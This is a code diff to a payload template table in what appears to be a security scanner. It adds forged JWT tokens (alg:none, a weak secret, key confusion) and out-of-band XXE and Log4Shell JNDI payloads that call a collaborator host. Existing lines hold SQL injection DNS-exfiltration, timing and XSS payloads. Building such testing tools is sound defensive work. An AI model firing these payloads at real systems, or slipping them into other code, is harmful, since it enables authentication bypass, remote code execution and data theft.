@@ -164,6 +164,27 @@ _TEMPLATES: dict[str, str] = {
     "sqli/blind/oob-dns-exfil": r"'; EXEC master..xp_dirtree '\\{nonce}.{collab}\poc'-- -",
     "sqli/blind/timing-sleep-paired": "' AND SLEEP({sleep})-- -",
     "xss/reflected/script-tag-canary": "<script>{canary}</script>",
+    # JWT forgery (structural/authz, no injection sink). Every JWT segment is
+    # base64url — braces are not base64url characters, so a ``{object_id}`` slot
+    # inside an encoded segment would corrupt the token. These are therefore
+    # fully-formed precomputed tokens (no live slots): alg:none has an empty
+    # signature; weak-secret / key-confusion carry real HMAC-SHA256 signatures
+    # over ``header.payload`` with the canonical weak secret ``secret`` and the
+    # documented placeholder ``public_key`` respectively. Acceptance is decided
+    # by the STRUCTURAL JWT_FORGERY oracle (2xx vs 4xx), never by these strings.
+    "jwt_forgery/none-alg": "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
+    "jwt_forgery/hs256-key-confusion": (
+        "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.z3cU1wl_qNMB3_6Br3I7esH0TmClpmk6MbEtq9Q86-E"
+    ),
+    "jwt_forgery/weak-secret": (
+        "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.GdYrDf_hp3IHBhv_b91SSCh7N2Lp19bHJXciDzy8C_c"
+    ),
+    # Blind OOB shapes — {nonce}/{collab} are the existing per-fire correlators
+    # (mint_fire_kit provides them); confirmation is the OOB_CALLBACK oracle
+    # (probe_nonce in observed_nonces). Literal braces survive targeted
+    # replacement: ``${jndi:ldap://…}`` and ``<!ENTITY …>`` are untouched.
+    "sqli_blind/oob-xxe-exfil": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{nonce}.{collab}/xxe">]>',
+    "command_injection/log4shell-oob": "${jndi:ldap://{nonce}.{collab}/a}",
 }
 
 
